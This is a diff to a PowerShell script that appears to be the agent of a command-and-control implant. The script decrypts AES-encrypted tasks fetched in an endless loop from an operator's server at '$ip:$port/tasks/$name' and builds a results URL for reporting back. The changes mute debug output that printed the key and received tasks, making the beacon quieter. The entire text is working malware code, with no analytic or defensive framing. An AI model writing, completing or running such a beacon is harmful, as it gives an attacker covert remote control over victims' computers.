@@ -34,7 +34,7 @@ function Encrypt-String($key, $unencryptedString) {
 }
 
 function Decrypt-String($key, $encryptedStringWithIV) {
-    Write-Host $key
+    # Write-Host $key
     $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
     $IV = $bytes[0..15]
     $aesManaged = Create-AesManagedObject $key $IV
@@ -94,22 +94,20 @@ if ($flag -eq "VALID"){
 sleep $n
 
 $resultl = ("http" + ':' + "//$ip" + ':' + "$port/results/")
-$taskl   = ("http" + ':' + "//$ip" + ':' + "$port/tasks/$name")
 
 for (;;){
 
-    Write-Host "Doing one more loop"
+    $taskl   = ("http" + ':' + "//$ip" + ':' + "$port/tasks/$name")
     
     ### check response NOT existence
     $taskId = ""
     $task  = (Invoke-WebRequest -UseBasicParsing -Uri $taskl -Method 'GET').Content
-    # $task = ""
-    Write-Host $task
+    # Write-Host $task
     
     if (-Not [string]::IsNullOrEmpty($task)){
         
         $task = Decrypt-String $key $task
-        Write-Host $task
+        # Write-Host $task
         $task = $task.split()
         $flag = $task[0]
         
